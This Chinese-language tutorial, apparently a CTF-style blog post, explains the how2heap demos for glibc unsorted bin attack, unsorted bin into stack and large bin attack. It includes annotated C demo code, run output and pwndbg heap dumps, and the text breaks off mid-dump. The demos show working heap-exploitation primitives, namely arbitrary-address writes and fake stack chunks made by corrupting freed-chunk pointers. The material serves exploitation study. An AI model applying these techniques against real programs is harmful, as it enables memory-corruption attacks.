# how2heap之unsorted bin&&largebin

阅读量 **868545**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-02-18 11:45:58

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t01e0c10f1efb991b6e.jpg)

> 欢迎各位喜欢安全的小伙伴们加入星盟安全 UVEgZ3JvdXA6IDU3MDI5NTQ2MQ==
>
> 本文包括unsorted bin attack,unsorted bin into stack,large bin attck

PS:由于本人才疏学浅,文中可能会有一些理解的不对的地方,欢迎各位斧正 🙂

## 参考网站

    
    
    https://ctf-wiki.github.io/ctf-wiki/pwn/
    https://www.anquanke.com/post/id/85127
    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/
    https://www.freebuf.com/articles/system/209096.html
    https://bbs.pediy.com/thread-223283.htm
    https://xz.aliyun.com/t/5177?accounttraceid=d0a1f6bd7256460885a64d78c885c8caznnf
    https://www.anquanke.com/post/id/183877
    

## 0x01 unsorted bin attack

###  序

unsoted bin attack的杀伤力虽然不够,但也是不可小视的辅助攻击方式,第一个我们就先来看unsorted bin attack吧

wiki上的[介绍](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/)

这里简要介绍一下:

在_int_malloc中有这么一段代码,他会在unsorted bin取出时被调用:

    
    
    unsorted_chunks (av)->bk = bck;
    bck->fd = unsorted_chunks (av);
    

那么这个bck是什么呢?

    
    
    bck = victim->bk
    

因此我们只需要控制bk指针就可以让bck位置可控，而我们的bck->fd也就可控了，此时就可以往任意地址写一个东西,但是写的东西不归我们控制,因此只能打辅助2333

###  源代码

这个代码真心少啊我说2333,同样的,我加了一点注释删了些东西

作者的话的大概意思:

本demo使用unsorted bin attack技巧将一个很大的无符号long型值写进了栈里

在实际中,unsorted bin attack常常用于为其他的攻击做辅助,比如覆写global_max_fast来为fastbin attack做辅助

    
    
    #include <stdio.h>
    #include <stdlib.h>
    
    int main(){
    
            unsigned long stack_var=0;
            //stack_var就是我们的攻击目标
            fprintf(stderr, "Let's first look at the target we want to rewrite on stack:n");
            fprintf(stderr, "%p: %ldnn", &stack_var, stack_var);
    
            unsigned long *p=malloc(400);
    
            // 我们先在堆上分配一个正常的chunk
            fprintf(stderr, "Now, we allocate first normal chunk on the heap at: %pn",p);
            //并且分配另一个正常的chunk来避免free第一个chunk时该chunk与top chunk合并
            fprintf(stderr, "And allocate another normal chunk in order to avoid consolidating the top chunk with"
               "the first one during the free()nn");
            malloc(500);
    
            free(p);
            //现在我们释放的p将会被放入unsorted bin中,并且其bk指向p[1]
            fprintf(stderr, "We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "
                       "point to %pn",(void*)p[1]);
    
            //------------VULNERABILITY-----------    
            p[1]=(unsigned long)(&stack_var-2);
            //现在我们模拟有一个漏洞让我们可以覆写victim->bk指针
            fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointern");
            fprintf(stderr, "And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%pnn",(void*)p[1]);
    
            //------------------------------------    
            malloc(400);
            //现在我们再分配一次来取回我们刚刚free掉的chunk,此时攻击目标已经被改写了
            fprintf(stderr, "Let's malloc again to get the chunk we just free. During this time, the target should have already been "
                       "rewritten:n");
            fprintf(stderr, "%p: %pn", &stack_var, (void*)stack_var);
    }
    

###  运行结果

    
    
    This file demonstrates unsorted bin attack by write a large unsigned long value into stack
    In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack
    
    Let's first look at the target we want to rewrite on stack:
    0x7ffdabb6d048: 0
    
    Now, we allocate first normal chunk on the heap at: 0x16d6010
    And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()
    
    We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7fb225384b78
    Now emulating a vulnerability that can overwrite the victim->bk pointer
    And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffdabb6d038
    
    Let's malloc again to get the chunk we just free. During this time, the target should have already been rewritten:
    0x7ffdabb6d048: 0x7fb225384b78
    

###  调试

断点位置

    
    
       9   unsigned long stack_var=0;
     ► 10         fprintf(stderr, "Let's first look at the target we want to rewrite on stack:n");
    
     ► 13         unsigned long *p=malloc(400);
    
     ► 17   malloc(500);
    
       19   free(p);
     ► 20         fprintf(stderr, "We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "
    
       25   p[1]=(unsigned long)(&stack_var-2);
     ► 26         fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointern");
    
       31   malloc(400);
     ► 32         fprintf(stderr, "Let's malloc again to get the chunk we just free. During this time, the target should have already been "
    

下面我们直接运行看下,首先给定义变量stack_var,赋初值为0

    
    
    pwndbg> p stack_var
    $2 = 0
    pwndbg> p &stack_var
    $3 = (unsigned long *) 0x7fffffffe5c8
    

下面malloc一下

    
    
    pwndbg> heap
    0x602000 PREV_INUSE {
      prev_size = 0,
      size = 417,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x6021a0 PREV_INUSE {
      prev_size = 0,
      size = 134753,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    

然后malloc(500)来防止p free的时候与top chunk合并

    
    
    pwndbg> heap
    0x602000 PREV_INUSE {
      prev_size = 0,
      size = 417,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x6021a0 PREV_INUSE {
      prev_size = 0,
      size = 513,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x6023a0 PREV_INUSE {
      prev_size = 0,
      size = 134241,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    

然后释放p,p被插入到unsortedbin中

    
    
    pwndbg> heap
    0x602000 PREV_INUSE {
      prev_size = 0,
      size = 417,
      fd = 0x7ffff7dd1b78 <main_arena+88>,
      bk = 0x7ffff7dd1b78 <main_arena+88>,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000
    smallbins
    empty
    largebins
    empty
    

此时的p[1]

    
    
    pwndbg> p/x p[1]
    $5 = 0x7ffff7dd1b78
    pwndbg> x/10gx p[1]
    0x7ffff7dd1b78 <main_arena+88>: 0x00000000006023a0      0x0000000000000000
    0x7ffff7dd1b88 <main_arena+104>:        0x0000000000602000      0x0000000000602000
    0x7ffff7dd1b98 <main_arena+120>:        0x00007ffff7dd1b88      0x00007ffff7dd1b88
    0x7ffff7dd1ba8 <main_arena+136>:        0x00007ffff7dd1b98      0x00007ffff7dd1b98
    0x7ffff7dd1bb8 <main_arena+152>:        0x00007ffff7dd1ba8      0x00007ffff7dd1ba8
    

然后给p[1]赋值

    
    
    0x602000 PREV_INUSE {
      prev_size = 0,
      size = 417,
      fd = 0x7ffff7dd1b78 <main_arena+88>,
      bk = 0x7fffffffe5b8,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all [corrupted]
    FD: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000
    BK: 0x602000 —▸ 0x7fffffffe5b8 —▸ 0x602010 ◂— 0x0
    smallbins
    empty
    largebins
    empty
    

可以看到,我们的bk指针已经被修改为了&stack-2的位置,也就是

    
    
    pwndbg> p &stack_var
    $13 = (unsigned long *) 0x7fffffffe5c8
    pwndbg> p/x  0x7fffffffe5c8- 0x7fffffffe5b8
    $14 = 0x10
    

然后我们取出我们的unsorted bin

    
    
    pwndbg> p/x stack_var
    $15 = 0x7ffff7dd1b78
    

可以看到我们的var_stack的值已经被写成了我们unsortedbin(av)的值了

###  总结

程序首先定义了一个变量stack_var,紧接着malloc了两个chunk

之后Free掉了第一块chunk,并修改p->bk=&stack_var,这个时候再malloc出来

然后我们的变量值就被改成了unsorted bin(av)的地址

在正常使用中,因为unsorted bin写入的值并非可控值,因此只是起到一个辅助的作用

## 0x02 unsorted bin into stack

###  序

这个是unsorted bin attack 的第二例，是修改unsorted bin里chunk的bk指针来达到在栈上malloc出chunk的攻击方式

###  源代码

话不多说,我们直接看源码,同样的,我加了些注释

    
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <stdint.h>
    
    int main() {
      intptr_t stack_buffer[4] = {0};
    
      fprintf(stderr, "Allocating the victim chunkn");
      intptr_t* victim = malloc(0x100);
    
      fprintf(stderr, "Allocating another chunk to avoid consolidating the top chunk with the small one during the free()n");
      intptr_t* p1 = malloc(0x100);
    
      fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted binn", victim);
      free(victim);
    
      //在栈上伪造一个fake chunk
      fprintf(stderr, "Create a fake chunk on the stack");
      //设置下一次分配的大小并且把bk指针指向任意可写的地址
      fprintf(stderr, "Set size for next allocation and the bk pointer to any writable address");
      stack_buffer[1] = 0x100 + 0x10;
      stack_buffer[3] = (intptr_t)stack_buffer;
    
      //------------VULNERABILITY-----------      //现在假设我们有一个漏洞可以让我们覆写victim->size和victim->bk指针
      fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->size and victim->bk pointern");
      //size必须和下一个请求的size不同以返回一个fake_chunk并且需要bypass 2*SIZE_SZ>16 && 2*SIZE<av->system->mem 的检查
      fprintf(stderr, "Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && < av->system_memn");
      victim[-1] = 32;
      victim[1] = (intptr_t)stack_buffer; // victim->bk is pointing to stack
      //------------------------------------    
      //现在我们就可以返回我们的fake_chunk了
      fprintf(stderr, "Now next malloc will return the region of our fake chunk: %pn", &stack_buffer[2]);
      fprintf(stderr, "malloc(0x100): %pn", malloc(0x100));
    }
    

###  运行结果

    
    
    root@284662b4a7a3:~/how2heap/glibc_2.25# ./unsorted_bin_into_stack
    Allocating the victim chunk
    Allocating another chunk to avoid consolidating the top chunk with the small one during the free()
    Freeing the chunk 0x1078010, it will be inserted in the unsorted bin
    Create a fake chunk on the stackSet size for next allocation and the bk pointer to any writable addressNow emulating a vulnerability that can overwrite the victim->size and victim->bk pointer
    Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && < av->system_mem
    Now next malloc will return the region of our fake chunk: 0x7ffda9d27830
    malloc(0x100): 0x7ffda9d27830
    

###  关键代码调试

本例我一共下了五个断点

    
    
       12   intptr_t* p1 = malloc(0x100);
       13
     ► 14   fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted binn", victim);
    
       15   free(victim);
       16
     ► 17   fprintf(stderr, "Create a fake chunk on the stack");
    
       19   stack_buffer[1] = 0x100 + 0x10;
       20   stack_buffer[3] = (intptr_t)stack_buffer;
       21
       22   //------------VULNERABILITY-----------     ► 23   fprintf(stderr  , "Now emulating a vulnerability that can overwrite the victim->size and victim->bk pointern");
    
       25   victim[-1] = 32;
       26   victim[1] = (intptr_t)stack_buffer; // victim->bk is pointing to stack
       27   //------------------------------------       28
     ► 29   fprintf(stderr, "Now next malloc will return the region of our fake chunk: %pn", &stack_buffer[2]);
    
    
     ► 30   fprintf(stderr, "malloc(0x100): %pn", malloc(0x100));
       31 }
    

好了,下面开始运行一下,先分配两个指针

    
    
    pwndbg> heap
    0x602000 PREV_INUSE {
      prev_size = 0,
      size = 273,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x602110 PREV_INUSE {
      prev_size = 0,
      size = 273,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x602220 PREV_INUSE {
      prev_size = 0,
      size = 134625,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> p/x stack_buffer
    $1 = {0x0, 0x0, 0x0, 0x0}
    pwndbg> p/x &stack_buffer
    $2 = 0x7fffffffe5b0
    

之后我们free掉victim,此时

    
    
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000
    smallbins
    empty
    largebins
    empty
    

然后我们修改一下栈的布局

    
    
    pwndbg> x/10gx stack_buffer
    0x7fffffffe5b0: 0x0000000000000000      0x0000000000000110
    0x7fffffffe5c0: 0x0000000000000000      0x00007fffffffe5b0
    0x7fffffffe5d0: 0x00007fffffffe6c0      0xae78811595436300
    0x7fffffffe5e0: 0x0000000000400870      0x00007ffff7a2d830
    0x7fffffffe5f0: 0x0000000000000000      0x00007fffffffe6c8
    

此时我们已经伪造了一个fake chunk,紧接着再覆写victim的size和bk指针

    
    
    pwndbg> x/10gx victim-2
    0x602000:       0x0000000000000000      0x0000000000000020
    0x602010:       0x00007ffff7dd1b78      0x00007fffffffe5b0
    0x602020:       0x0000000000000000      0x0000000000000000
    0x602030:       0x0000000000000000      0x0000000000000000
    0x602040:       0x0000000000000000      0x0000000000000000
    pwndbg> heap
    0x602000 {
      prev_size = 0,
      size = 32,
      fd = 0x7ffff7dd1b78 <main_arena+88>,
      bk = 0x7fffffffe5b0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x602020 {
      prev_size = 0,
      size = 0,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all [corrupted]
    FD: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000
    BK: 0x602000 —▸ 0x7fffffffe5b0 ◂— 0x7fffffffe5b0
    smallbins
    empty
    largebins
    empty
    

由于刚刚的更改，我们的fake chunk已经被系统认为是链入到unsorted bin中的，所以最后malloc一下就可以返回我们的fake_chunk了

    
    
    pwndbg> heap
    0x602000 {
      prev_size = 0,
      size = 32,
      fd = 0x7ffff7dd1b88 <main_arena+104>,
      bk = 0x7ffff7dd1b88 <main_arena+104>,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x602020 {
      prev_size = 0,
      size = 0,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all [corrupted]
    FD: 0x602000 —▸ 0x7ffff7dd1b88 (main_arena+104) ◂— 0x602000
    BK: 0x7fffffffe5b0 ◂— 0x7fffffffe5b0
    smallbins
    0x20: 0x602000 —▸ 0x7ffff7dd1b88 (main_arena+104) ◂— 0x602000
    largebins
    empty
    

可以看到，我们之前的free bins被放进了small bin中

###  总结

程序先是在栈上定义了一个数组

随即分配了两个大小为0x100的chunk vitcim和chunk p1

紧接着释放了victim把他放进了unsorted bin中，之后在栈上伪造了一个fake chunk

最后修改了victim的Size和bk指针，将我们的fake chunk链入我们的unsorted bin中

此时我们再malloc一个合适大小的chunk就可以在我们的栈上malloc出来了

## large bin attack

###  序

对于large bin attack的利用研究任重而道远

在开始之前我一定要说一句,对glibc分配机制不熟悉的建议还是多看看(或者直接去看glibc2.29的内容,毕竟要紧跟时代潮流嘛,现在glibc2.29的题目也越来越多了

我们先看看例子中拿出来的部分

    
    
        [...]
                  else
                  {
                      victim->fd_nextsize = fwd;
                      victim->bk_nextsize = fwd->bk_nextsize;
                      fwd->bk_nextsize = victim;
                      victim->bk_nextsize->fd_nextsize = victim;
                  }
                  bck = fwd->bk;
        [...]
        mark_bin (av, victim_index);
        victim->bk = bck;
        victim->fd = fwd;
        fwd->bk = victim;
        bck->fd = victim;
        For more details on how large-bins are handled and sorted by ptmalloc,
        please check the Background section in the aforementioned link.
    

这里推荐作者给出的[链接](https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/)

当然,我在这里简单说一哈

我们的large bin管理free 掉的 chunk时,我们的bk_nextsize和fd_nextsize就启用了

large bin是双循环链表,对于同样大小的free
chunk我们所释放的第一个chunk会成为一个堆头,其bk_nextsize指向下一个比他大的堆头,而fd_nextsize指向下一个比他小的堆头,然后最大的堆头的bk_nextsize指向最小的堆头,最小的堆头的fd_nextsize指向最大的堆头,而剩下的free
chunk就会通过fd和bk指针链在堆头的下面,他们的fd_nextsize和bk_nextsize的值都为0

形状的话就像是多个chunk按大小(从大到小)围成一个圆(最大最小相接),而每一个chunk的后面都链着一排和他一样大小的chunk

那我们如何利用呢?

    
    
        victim->fd_nextsize = fwd;
        victim->bk_nextsize = fwd->bk_nextsize;
        fwd->bk_nextsize = victim
        victim->bk_nextsize->fd_nextsize=victim
    
        bck = fwd->bk;
    
        mark_bin (av, victim_index)
        victim->bk = bck;
        victim->fd = fwd;
        fwd->bk = victim;
        bck->fd = victim;
    

而这个过程中,我们的fwd是可控的,而又因为我们的fwd可控,也就意味着我们的fwd->bk_nextsize可控,bck可控

因此我们在这个过程中就有两次任意地址写堆地址的能力

第一次在victim->bk_nextsize也就是victim+4的地方

第二次在victim->bk=bck=fwd->bk的地方,也就是victim+2的地方

这两个地方可以写入fwd->bk_nextsize和fwd->bk

###  源代码

这里我就一行也不删了,直接在上面加了一小点注释

如果想了解large bin的话,可以去源代码给出的链接中看看

    
    
    /*
        This technique is taken from
        https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/
        [...]
                  else
                  {
                      victim->fd_nextsize = fwd;
                      victim->bk_nextsize = fwd->bk_nextsize;
                      fwd->bk_nextsize = victim;
                      victim->bk_nextsize->fd_nextsize = victim;
                  }
                  bck = fwd->bk;
        [...]
        mark_bin (av, victim_index);
        victim->bk = bck;
        victim->fd = fwd;
        fwd->bk = victim;
        bck->fd = victim;
        For more details on how large-bins are handled and sorted by ptmalloc,
        please check the Background section in the aforementioned link.
        [...]
     */
    
    #include<stdio.h>
    #include<stdlib.h>
    
    int main()
    {
        //本例以通过写一个大的无符号long型数值进入栈来演示large bin attack
        fprintf(stderr, "This file demonstrates large bin attack by writing a large unsigned long value into stackn");
        //在实际中,large bin attack也常常被用于更深层次的攻击,如覆写global_max_fast来为fastbin attack打辅助(为什么有一种看到了unsorted bin attack的错觉2333
        fprintf(stderr, "In practice, large bin attack is generally prepared for further attacks, such as rewriting the "
               "global variable global_max_fast in libc for further fastbin attacknn");
    
        unsigned long stack_var1 = 0;
        unsigned long stack_var2 = 0;
    
        //我们要在栈上覆写的是stack_var1和stack_var2
        fprintf(stderr, "Let's first look at the targets we want to rewrite on stack:n");
        fprintf(stderr, "stack_var1 (%p): %ldn", &stack_var1, stack_var1);
        fprintf(stderr, "stack_var2 (%p): %ldnn", &stack_var2, stack_var2);
    
        unsigned long *p1 = malloc(0x320);
        //现在我们有了第一个large chunk
        fprintf(stderr, "Now, we allocate the first large chunk on the heap at: %pn", p1 - 2);
    
        //然后申请一个fastbin chunk 来避免我们的第一个large chunk free的时候与下一个large chunk合并
        fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
               " the first large chunk during the free()nn");
        malloc(0x20);
    
        unsigned long *p2 = malloc(0x400);
        //现在是第二个large chunk
        fprintf(stderr, "Then, we allocate the second large chunk on the heap at: %pn", p2 - 2);
    
        //同理,防止第二个free的时候与下一个large chunk合并
        fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
               " the second large chunk during the free()nn");
        malloc(0x20);
    
        unsigned long *p3 = malloc(0x400);
        //最后我们分配第三个large chunk
        fprintf(stderr, "Finally, we allocate the third large chunk on the heap at: %pn", p3 - 2);
    
        //这个fastbin是为了防止和top chunk合并
        fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the top chunk with"
               " the third large chunk during the free()nn");
        malloc(0x20);
    
        free(p1);
        free(p2);
        //现在我们free掉第一个和第二个large chunks,此时他们会被插入到unsorted bin中
        fprintf(stderr, "We free the first and second large chunks now and they will be inserted in the unsorted bin:"
               " [ %p <--> %p ]nn", (void *)(p2 - 2), (void *)(p2[0]));
    
        malloc(0x90);
        //此时,我们申请一个小于被释放的第一个large chunk的chunk
        fprintf(stderr, "Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the"
                " freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation"
                ", and reinsert the remaining of the freed first large chunk into the unsorted bin:"
                " [ %p ]nn", (void *)((char *)p1 + 0x90));
    
        free(p3);
        //现在我们free第三个large chunk
        fprintf(stderr, "Now, we free the third large chunk and it will be inserted in the unsorted bin:"
               " [ %p <--> %p ]nn", (void *)(p3 - 2), (void *)(p3[0]));
    
        //------------VULNERABILITY-----------    
        //现在假设我们有一个漏洞可以覆写被free的第二个large chunk的size,bk,bk_nextsize指针
        fprintf(stderr, "Now emulating a vulnerability that can overwrite the freed second large chunk's "size""
                " as well as its "bk" and "bk_nextsize" pointersn");
    
        //现在我们减少被free的第二个large chunk来逼迫malloc将被free的第三个large chunk插入到large bin freelist的头部
        fprintf(stderr, "Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk"
        //为了覆写栈上的值,我们将在stack_var1前将bk设位16bytes,并在stack_var2前将bk_nextsize设为32bytes
                " at the head of the large bin freelist. To overwrite the stack variables, we set "bk" to 16 bytes before stack_var1 and"
                " "bk_nextsize" to 32 bytes before stack_var2nn");
    
        p2[-1] = 0x3f1;
        p2[0] = 0;
        p2[2] = 0;
        p2[1] = (unsigned long)(&stack_var1 - 2);
        p2[3] = (unsigned long)(&stack_var2 - 4);
    
        //------------------------------------    
        malloc(0x90);
    
        //让我们再malloc一次,这样被释放的large chunk就被插入到large bin freelist了
        fprintf(stderr, "Let's malloc again, so the freed third large chunk being inserted into the large bin freelist."
        //在这期间,我们的目标已经被改写
                " During this time, targets should have already been rewritten:n");
    
        fprintf(stderr, "stack_var1 (%p): %pn", &stack_var1, (void *)stack_var1);
        fprintf(stderr, "stack_var2 (%p): %pn", &stack_var2, (void *)stack_var2);
    
        return 0;
    }
    

###  运行结果

    
    
    root@284662b4a7a3:~/how2heap/glibc_2.25# ./large_bin_attack
    This file demonstrates large bin attack by writing a large unsigned long value into stack
    In practice, large bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack
    
    Let's first look at the targets we want to rewrite on stack:
    stack_var1 (0x7ffe64e357c0): 0
    stack_var2 (0x7ffe64e357c8): 0
    
    Now, we allocate the first large chunk on the heap at: 0x1d99000
    And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the first large chunk during the free()
    
    Then, we allocate the second large chunk on the heap at: 0x1d99360
    And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the second large chunk during the free()
    
    Finally, we allocate the third large chunk on the heap at: 0x1d997a0
    And allocate another fastbin chunk in order to avoid consolidating the top chunk with the third large chunk during the free()
    
    We free the first and second large chunks now and they will be inserted in the unsorted bin: [ 0x1d99360 <--> 0x1d99000 ]
    
    Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation, and reinsert the remaining of the freed first large chunk into the unsorted bin: [ 0x1d990a0 ]
    
    Now, we free the third large chunk and it will be inserted in the unsorted bin: [ 0x1d997a0 <--> 0x1d990a0 ]
    
    Now emulating a vulnerability that can overwrite the freed second large chunk's "size" as well as its "bk" and "bk_nextsize" pointers
    Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk at the head of the large bin freelist. To overwrite the stack variables, we set "bk" to 16 bytes before stack_var1 and "bk_nextsize" to 32 bytes before stack_var2
    
    Let's malloc again, so the freed third large chunk being inserted into the large bin freelist. During this time, targets should have already been rewritten:
    stack_var1 (0x7ffe64e357c0): 0x1d997a0
    stack_var2 (0x7ffe64e357c8): 0x1d997a0
    

###  关键代码调试

这里我也下了几个断点

    
    
       41     unsigned long stack_var1 = 0;
       42     unsigned long stack_var2 = 0;
       43
     ► 44     fprintf(stderr, "Let's first look at the targets we want to rewrite on stack:n");
    
       67     malloc(0x20);
       68
     ► 69     free(p1);
    
       69     free(p1);
     ► 70     free(p2);
    
       70     free(p2);
     ► 71     fprintf(stderr, "We free the first and second large chunks now and they will be inserted in the unsorted bin:"
       72            " [ %p <--> %p ]nn", (void *)(p2 - 2), (void *)(p2[0]));
    
       74     malloc(0x90);
     ► 75     fprintf(stderr, "Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the"
    
       80     free(p3);
     ► 81     fprintf(stderr, "Now, we free the third large chunk and it will be inserted in the unsorted bin:"
       82            " [ %p <--> %p ]nn", (void *)(p3 - 2), (void *)(p3[0]));
    
    
       92     p2[-1] = 0x3f1;
       93     p2[0] = 0;
       94     p2[2] = 0;
       95     p2[1] = (unsigned long)(&stack_var1 - 2);
       96     p2[3] = (unsigned long)(&stack_var2 - 4);
       97
       98     //------------------------------------       99
     ► 100     malloc(0x90);
    
       100     malloc(0x90);
       101
     ► 102     fprintf(stderr, "Let's malloc again, so the freed third large chunk being inserted into the large bin freelist."
    

好了,运行一下康康,首先是栈上的两个变量

    
    
    pwndbg> x/10gx & stack_var1
    0x7fffffffe5c0: 0x0000000000000000      0x0000000000000000
    0x7fffffffe5d0: 0x0000000000400a30      0x00000000004005b0
    0x7fffffffe5e0: 0x00007fffffffe6d0      0x9310f5c464b47700
    0x7fffffffe5f0: 0x0000000000400a30      0x00007ffff7a2d830
    0x7fffffffe600: 0x0000000000000000      0x00007fffffffe6d8
    

之后程序继续运行,下面是所有我们分配的chunk

    
    
    pwndbg> heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 817,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603330 FASTBIN {
      prev_size = 0,
      size = 49,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603360 PREV_INUSE {
      prev_size = 0,
      size = 1041,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603770 FASTBIN {
      prev_size = 0,
      size = 49,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x6037a0 PREV_INUSE {
      prev_size = 0,
      size = 1041,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603bb0 FASTBIN {
      prev_size = 0,
      size = 49,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603be0 PREV_INUSE {
      prev_size = 0,
      size = 132129,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg>
    

这里我们继续吧,首先我们释放了P1,此时的bins

    
    
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x603000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603000
    smallbins
    empty
    largebins
    empty
    

然后我们释放了P2,此时的bins

    
    
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x603360 —▸ 0x603000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603360 /* '`3`' */
    smallbins
    empty
    largebins
    empty
    pwndbg>
    

可以看到我们释放的两个chunk都被放到了unsorted bin中,因此我们再申请一个小chunk,系统就会把我们的第二个free
chunk丢到large bin中了

之后我们再康康我们现在unsorted bin中的chunk,这个chunk已经是被分割过的了

    
    
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x6030a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6030a0
    smallbins
    empty
    largebins
    0x400: 0x603360 —▸ 0x7ffff7dd1f68 (main_arena+1096) ◂— 0x603360 /* '`3`' */
    pwndbg> x/10x 0x603000
    0x603000:       0x0000000000000000      0x00000000000000a1
    0x603010:       0x00007ffff7dd1e98      0x00007ffff7dd1e98
    0x603020:       0x0000000000000000      0x0000000000000000
    0x603030:       0x0000000000000000      0x0000000000000000
    0x603040:       0x0000000000000000      0x0000000000000000
    pwndbg> x/10gx 0x6030a0
    0x6030a0:       0x0000000000000000      0x0000000000000291
    0x6030b0:       0x00007ffff7dd1b78      0x00007ffff7dd1b78
    0x6030c0:       0x0000000000000000      0x0000000000000000
    0x6030d0:       0x0000000000000000      0x0000000000000000
    0x6030e0:       0x0000000000000000      0x0000000000000000
    

然后我们再运行一下,这里已经free了p3

    
    
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
